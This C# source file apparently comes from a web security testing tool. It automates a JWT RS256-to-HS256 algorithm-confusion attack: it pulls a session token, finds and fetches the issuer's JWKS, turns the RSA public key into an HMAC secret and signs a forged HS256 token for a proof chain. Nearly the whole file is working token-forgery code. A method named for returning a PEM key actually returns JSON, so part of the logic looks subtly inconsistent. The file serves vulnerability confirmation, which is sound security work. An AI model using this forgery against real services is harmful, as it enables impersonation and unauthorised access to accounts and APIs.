using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using Trowser.Automation;
using Trowser.Security.ChainEngine;

namespace Trowser.Security;

/// <summary>
/// Prepares RS256→HS256 algorithm-confusion proof substitutions for chain-prove.
/// </summary>
public static class JwtAlgorithmConfusionHelper
{
    public static async Task<Dictionary<string, string>> EnrichSubstitutionsAsync(
        AutomationContext ctx,
        IReadOnlyList<ChainableFinding> findings,
        Dictionary<string, string> vars,
        CancellationToken ct = default)
    {
        var extra = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

        if (!vars.TryGetValue("endpoint", out var endpoint) || string.IsNullOrWhiteSpace(endpoint))
        {
            var jwtFinding = findings.FirstOrDefault(f =>
                f.Category.Equals("jwt-acceptance", StringComparison.OrdinalIgnoreCase)
                || f.Category.Equals("jwt-header-abuse", StringComparison.OrdinalIgnoreCase));
            if (jwtFinding?.Endpoint != null)
                extra["endpoint"] = jwtFinding.Endpoint;
        }

        var analyzed = await HttpSecurityProbes.RunJwtAnalyzeAsync(ctx, null, ct);
        var tokenRow = analyzed.Tokens.FirstOrDefault(t =>
            string.Equals(t.HeaderAlg, "RS256", StringComparison.OrdinalIgnoreCase))
            ?? analyzed.Tokens.FirstOrDefault();

        var raw = tokenRow?.Raw;
        if (string.IsNullOrWhiteSpace(raw) || raw.Contains('…'))
            return extra;

        raw = JwtProbeHelpers.NormalizeBearerToken(raw);
        if (string.IsNullOrWhiteSpace(raw)) return extra;

        var jwksUrl = await ResolveJwksUrlAsync(ctx, raw, ct);
        if (!string.IsNullOrWhiteSpace(jwksUrl))
            extra["jwksUrl"] = jwksUrl;

        if (string.IsNullOrWhiteSpace(jwksUrl))
        {
            extra["forgedHs256Token"] = "";
            extra["jwtConfusionNote"] =
                "Fetch JWKS manually (POST /api/security/oidc-analyze or /.well-known/jwks.json), then jwt-forge with alg HS256.";
            return extra;
        }

        var jwksBody = await FetchJwksAsync(ctx, jwksUrl, ct);
        var secret = ExtractRsaPublicKeyPem(jwksBody);
        if (secret == null)
        {
            extra["forgedHs256Token"] = "";
            extra["jwtConfusionNote"] = "JWKS fetched but no RSA public key (n/e) found for HS256 confusion.";
            return extra;
        }

        try
        {
            using var mods = JsonDocument.Parse("""{"header":{"alg":"HS256","typ":"JWT"}}""");
            var forged = HttpSecurityProbes.ForgeJwt(raw, mods.RootElement, stripSignature: false);
            var hs256Token = SignHs256(forged.HeaderJson, forged.PayloadJson, secret);
            extra["forgedHs256Token"] = hs256Token;
            extra["jwtConfusionNote"] =
                "Auto-forged HS256 token using JWKS RSA public key material as HMAC secret (algorithm confusion test).";
        }
        catch (Exception ex)
        {
            extra["forgedHs256Token"] = "";
            extra["jwtConfusionNote"] = $"Could not forge HS256 token: {ex.Message}";
        }

        return extra;
    }

    private static async Task<string?> ResolveJwksUrlAsync(AutomationContext ctx, string token, CancellationToken ct)
    {
        try
        {
            var parts = token.Split('.');
            if (parts.Length < 2) return null;
            var payloadJson = Encoding.UTF8.GetString(JwtProbeHelpers.Base64UrlDecode(parts[1]));
            using var doc = JsonDocument.Parse(payloadJson);
            if (doc.RootElement.TryGetProperty("iss", out var iss))
            {
                var issuer = iss.GetString()?.TrimEnd('/');
                if (!string.IsNullOrEmpty(issuer))
                    return $"{issuer}/.well-known/jwks.json";
            }
        }
        catch { /* ignore */ }

        foreach (var entry in ctx.Network.Entries.AsEnumerable().Reverse())
        {
            ct.ThrowIfCancellationRequested();
            if (entry.Url.Contains("jwks", StringComparison.OrdinalIgnoreCase)
                && entry.StatusCode is >= 200 and < 300)
                return entry.Url;
        }

        var pageUrl = await ctx.GetCurrentUrl();
        if (Uri.TryCreate(pageUrl, UriKind.Absolute, out var uri))
            return $"{uri.GetLeftPart(UriPartial.Authority)}/.well-known/jwks.json";

        return null;
    }

    private static async Task<string> FetchJwksAsync(AutomationContext ctx, string url, CancellationToken ct)
    {
        var resp = await SecurityProbeHttp.FetchAsync(ctx, url, "GET", null, null, 12000, includeBrowserCookies: false, ct);
        return resp.Body ?? "";
    }

    private static string? ExtractRsaPublicKeyPem(string jwksBody)
    {
        if (string.IsNullOrWhiteSpace(jwksBody)) return null;
        try
        {
            using var doc = JsonDocument.Parse(jwksBody);
            if (!doc.RootElement.TryGetProperty("keys", out var keys) || keys.ValueKind != JsonValueKind.Array)
                return null;

            foreach (var key in keys.EnumerateArray())
            {
                if (key.TryGetProperty("kty", out var kty) && kty.GetString() == "RSA"
                    && key.TryGetProperty("n", out var nEl) && key.TryGetProperty("e", out var eEl))
                {
                    var n = nEl.GetString();
                    var e = eEl.GetString();
                    if (string.IsNullOrEmpty(n) || string.IsNullOrEmpty(e)) continue;
                    return JsonSerializer.Serialize(new { kty = "RSA", n, e });
                }
            }
        }
        catch { /* ignore */ }
        return null;
    }

    private static string SignHs256(string headerJson, string payloadJson, string secret)
    {
        var headerB64 = JwtProbeHelpers.Base64UrlEncode(Encoding.UTF8.GetBytes(headerJson));
        var payloadB64 = JwtProbeHelpers.Base64UrlEncode(Encoding.UTF8.GetBytes(payloadJson));
        var signingInput = $"{headerB64}.{payloadB64}";
        var keyBytes = Encoding.UTF8.GetBytes(secret);
        using var hmac = new HMACSHA256(keyBytes);
        var sig = hmac.ComputeHash(Encoding.UTF8.GetBytes(signingInput));
        var sigB64 = JwtProbeHelpers.Base64UrlEncode(sig);
        return $"{headerB64}.{payloadB64}.{sigB64}";
    }
}
